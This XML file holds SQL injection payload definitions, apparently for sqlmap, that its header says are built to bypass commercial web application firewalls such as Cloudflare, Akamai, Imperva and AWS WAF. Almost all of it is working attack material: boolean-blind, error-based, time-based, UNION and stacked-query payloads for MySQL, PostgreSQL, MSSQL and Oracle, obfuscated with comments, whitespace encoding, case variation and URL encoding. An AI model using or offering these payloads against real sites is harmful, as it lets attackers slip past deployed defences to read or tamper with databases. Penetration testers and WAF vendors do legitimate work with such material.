<?xml version="1.0" encoding="UTF-8"?>

<!--
Copyright (c) 2025 Aya Elbadry (@Aya-Elbadry)
New SQL Injection Payloads for WAF Bypass
These payloads are designed to bypass common WAF solutions including:
- Akamai WAF
- Cloudflare
- Imperva
- Incapsula
- WordFence
- ModSecurity
- AWS WAF
-->

<root>
    <!-- WAF Bypass - Boolean-based blind tests -->
    <test>
        <title>WAF Bypass - AND boolean-based blind with comment obfuscation</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/[INFERENCE]</vector>
        <request>
            <payload>AND/**/[RANDNUM]=[RANDNUM]</payload>
            <comment>/**/</comment>
        </request>
        <response>
            <comparison>AND/**/[RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>WAF Bypass - AND boolean-based blind with inline comment</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/*!50000[INFERENCE]*/</vector>
        <request>
            <payload>AND/*!50000[RANDNUM]=[RANDNUM]*/</payload>
        </request>
        <response>
            <comparison>AND/*!50000[RANDNUM]=[RANDNUM1]*/</comparison>
        </response>
    </test>

    <test>
        <title>WAF Bypass - AND boolean-based blind with space obfuscation</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND%09[INFERENCE]</vector>
        <request>
            <payload>AND%09[RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND%09[RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>WAF Bypass - AND boolean-based blind with newline obfuscation</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND%0A[INFERENCE]</vector>
        <request>
            <payload>AND%0A[RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND%0A[RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>WAF Bypass - AND boolean-based blind with parenthesis obfuscation</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND([INFERENCE])</vector>
        <request>
            <payload>AND([RANDNUM]=[RANDNUM])</payload>
        </request>
        <response>
            <comparison>AND([RANDNUM]=[RANDNUM1])</comparison>
        </response>
    </test>

    <!-- WAF Bypass - Error-based tests -->
    <test>
        <title>WAF Bypass - Error-based with comment obfuscation (MySQL)</title>
        <stype>2</stype>
        <level>2</level>
        <risk>2</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/EXTRACTVALUE([RANDNUM1],CONCAT(0x5c,0x717a6b7171,(SELECT/**/(CASE/**/WHEN/**/([INFERENCE])/**/THEN/**/1/**/ELSE/**/0/**/END)),0x717a707a71))</vector>
        <request>
            <payload>AND/**/EXTRACTVALUE([RANDNUM1],CONCAT(0x5c,0x717a6b7171,(SELECT/**/(CASE/**/WHEN/**/([RANDNUM]=[RANDNUM])/**/THEN/**/1/**/ELSE/**/0/**/END)),0x717a707a71))</payload>
        </request>
        <response>
            <grep>XPATH syntax error</grep>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>WAF Bypass - Error-based with space obfuscation (MySQL)</title>
        <stype>2</stype>
        <level>2</level>
        <risk>2</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND%09EXTRACTVALUE([RANDNUM1],CONCAT(0x5c,0x717a6b7171,(SELECT%09(CASE%09WHEN%09([INFERENCE])%09THEN%091%09ELSE%090%09END)),0x717a707a71))</vector>
        <request>
            <payload>AND%09EXTRACTVALUE([RANDNUM1],CONCAT(0x5c,0x717a6b7171,(SELECT%09(CASE%09WHEN%09([RANDNUM]=[RANDNUM])%09THEN%091%09ELSE%090%09END)),0x717a707a71))</payload>
        </request>
        <response>
            <grep>XPATH syntax error</grep>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <!-- WAF Bypass - Time-based blind tests -->
    <test>
        <title>WAF Bypass - Time-based blind with comment obfuscation (MySQL)</title>
        <stype>5</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/IF([INFERENCE],SLEEP([SLEEPTIME]),0)</vector>
        <request>
            <payload>AND/**/IF([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]),0)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>WAF Bypass - Time-based blind with space obfuscation (MySQL)</title>
        <stype>5</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND%09IF([INFERENCE],SLEEP([SLEEPTIME]),0)</vector>
        <request>
            <payload>AND%09IF([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]),0)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <test>
        <title>WAF Bypass - Time-based blind with BENCHMARK (MySQL)</title>
        <stype>5</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/IF([INFERENCE],BENCHMARK([SLEEPTIME]*1000000,MD5(1)),0)</vector>
        <request>
            <payload>AND/**/IF([RANDNUM]=[RANDNUM],BENCHMARK([SLEEPTIME]*1000000,MD5(1)),0)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <!-- WAF Bypass - UNION query tests -->
    <test>
        <title>WAF Bypass - UNION query with comment obfuscation</title>
        <stype>6</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>0</clause>
        <where>2</where>
        <vector>UNION/**/ALL/**/SELECT/**/[COLUMNS]</vector>
        <request>
            <payload>UNION/**/ALL/**/SELECT/**/[COLUMNS]</payload>
            <columns>1-10</columns>
        </request>
        <response>
            <union>1</union>
        </response>
    </test>

    <test>
        <title>WAF Bypass - UNION query with space obfuscation</title>
        <stype>6</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>0</clause>
        <where>2</where>
        <vector>UNION%09ALL%09SELECT%09[COLUMNS]</vector>
        <request>
            <payload>UNION%09ALL%09SELECT%09[COLUMNS]</payload>
            <columns>1-10</columns>
        </request>
        <response>
            <union>1</union>
        </response>
    </test>

    <!-- WAF Bypass - Stacked queries tests -->
    <test>
        <title>WAF Bypass - Stacked queries with comment obfuscation</title>
        <stype>4</stype>
        <level>2</level>
        <risk>3</risk>
        <clause>0</clause>
        <where>3</where>
        <vector>;/**/SELECT/**/SLEEP([SLEEPTIME])</vector>
        <request>
            <payload>;/**/SELECT/**/SLEEP([SLEEPTIME])</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>MySQL</dbms>
        </details>
    </test>

    <!-- Advanced WAF Bypass Techniques -->
    <test>
        <title>WAF Bypass - Boolean-based with hex encoding</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND 0x[RANDNUM]=0x[RANDNUM]</vector>
        <request>
            <payload>AND 0x[RANDNUM]=0x[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND 0x[RANDNUM]=0x[RANDNUM1]</comparison>
        </response>
    </test>

    <test>
        <title>WAF Bypass - Boolean-based with char() function</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND CHAR([RANDNUM])=CHAR([RANDNUM])</vector>
        <request>
            <payload>AND CHAR([RANDNUM])=CHAR([RANDNUM])</payload>
        </request>
        <response>
            <comparison>AND CHAR([RANDNUM])=CHAR([RANDNUM1])</comparison>
        </response>
    </test>

    <!-- PostgreSQL WAF Bypass -->
    <test>
        <title>WAF Bypass - Time-based blind with pg_sleep (PostgreSQL)</title>
        <stype>5</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/(SELECT/**/CASE/**/WHEN/**/([INFERENCE])/**/THEN/**/pg_sleep([SLEEPTIME])/**/ELSE/**/pg_sleep(0)/**/END)</vector>
        <request>
            <payload>AND/**/(SELECT/**/CASE/**/WHEN/**/([RANDNUM]=[RANDNUM])/**/THEN/**/pg_sleep([SLEEPTIME])/**/ELSE/**/pg_sleep(0)/**/END)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>PostgreSQL</dbms>
        </details>
    </test>

    <!-- MSSQL WAF Bypass -->
    <test>
        <title>WAF Bypass - Time-based blind with WAITFOR (MSSQL)</title>
        <stype>5</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/IF([INFERENCE],WAITFOR/**/DELAY/**/'0:0:[SLEEPTIME]',0)</vector>
        <request>
            <payload>AND/**/IF([RANDNUM]=[RANDNUM],WAITFOR/**/DELAY/**/'0:0:[SLEEPTIME]',0)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>Microsoft SQL Server</dbms>
        </details>
    </test>

    <!-- Oracle WAF Bypass -->
    <test>
        <title>WAF Bypass - Time-based blind with DBMS_PIPE (Oracle)</title>
        <stype>5</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/(SELECT/**/CASE/**/WHEN/**/([INFERENCE])/**/THEN/**/DBMS_PIPE.RECEIVE_MESSAGE(CHR([RANDNUM]),[SLEEPTIME])/**/ELSE/**/0/**/END/**/FROM/**/DUAL)</vector>
        <request>
            <payload>AND/**/(SELECT/**/CASE/**/WHEN/**/([RANDNUM]=[RANDNUM])/**/THEN/**/DBMS_PIPE.RECEIVE_MESSAGE(CHR([RANDNUM]),[SLEEPTIME])/**/ELSE/**/0/**/END/**/FROM/**/DUAL)</payload>
        </request>
        <response>
            <time>[SLEEPTIME]</time>
        </response>
        <details>
            <dbms>Oracle</dbms>
        </details>
    </test>

    <!-- Advanced Obfuscation Techniques -->
    <test>
        <title>WAF Bypass - Boolean-based with nested functions</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)</vector>
        <request>
            <payload>AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)</payload>
        </request>
        <response>
            <comparison>AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=SUBSTRING(CONCAT([RANDNUM1],[RANDNUM1]),1,1)</comparison>
        </response>
    </test>

    <test>
        <title>WAF Bypass - Boolean-based with LIKE operator</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>AND/**/[RANDNUM]/**/LIKE/**/[RANDNUM]</vector>
        <request>
            <payload>AND/**/[RANDNUM]/LIKE/[RANDNUM]</payload>
        </request>
        <response>
            <comparison>AND/**/[RANDNUM]/LIKE/[RANDNUM1]</comparison>
        </response>
    </test>

    <!-- Case variation bypass -->
    <test>
        <title>WAF Bypass - Boolean-based with case variation</title>
        <stype>1</stype>
        <level>2</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>aNd [INFERENCE]</vector>
        <request>
            <payload>aNd [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>aNd [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

    <!-- Double encoding bypass -->
    <test>
        <title>WAF Bypass - Boolean-based with double encoding</title>
        <stype>1</stype>
        <level>3</level>
        <risk>1</risk>
        <clause>1,8,9</clause>
        <where>1</where>
        <vector>%41%4E%44 [INFERENCE]</vector>
        <request>
            <payload>%41%4E%44 [RANDNUM]=[RANDNUM]</payload>
        </request>
        <response>
            <comparison>%41%4E%44 [RANDNUM]=[RANDNUM1]</comparison>
        </response>
    </test>

</root>



